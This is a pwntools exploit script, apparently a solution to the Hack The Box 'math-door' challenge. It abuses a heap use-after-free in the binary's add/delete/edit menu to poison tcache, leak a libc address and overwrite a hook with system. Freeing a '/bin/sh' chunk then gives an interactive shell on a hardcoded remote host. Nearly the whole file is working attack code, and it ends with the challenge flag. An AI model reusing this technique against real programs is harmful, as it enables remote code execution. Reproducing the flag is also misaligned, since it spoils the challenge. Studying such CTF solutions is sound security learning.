#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host loacalhost --port 1234 ./math-door
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./math-door_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '167.71.143.44'
port = int(args.PORT or 30358)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *math+144
# b *math+252
# b *math+317
continue
# c
# c
# c
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  '.'

libc = exe.libc
io = start()

def add():
    io.sendlineafter('Action: \n','1')

def delete(idx):
    io.sendlineafter('Action: \n','2')
    io.sendlineafter('index:\n',str(idx))

def edit(idx,data):
    io.sendlineafter('Action: \n','3')
    io.sendlineafter('index:\n',str(idx))
    io.sendafter('hieroglyph:\n',str(data))


add() # 0
add() # 1
add() # 2

delete(0)
delete(1)

edit(1,'\x38')

add() # 3
add() # 4

for i in range(40):
    add()

delete(6)
delete(5)
delete(2)

edit(4,p64(0x500-0x20))
delete(2)

edit(4,p64(0)+p64(0xac0+24))

add()
add() # 46
edit(46,p64(0)+p64(0)+p64(0x20))

io.recv(5)
leak = u64(io.recv(6)+'\x00\x00')
libc.address = leak - 0x1ee7e0
print hex(libc.address)

delete(41)
delete(40)

edit(41,p64(0x1725))

add()
add()
add()

edit(49,p64(libc.sym['system']))

edit(42,'/bin/sh\x00')

delete(42)

io.interactive()

# HTB{y0ur_m4th_1s_fr0m_4n0th3r_w0rld!}

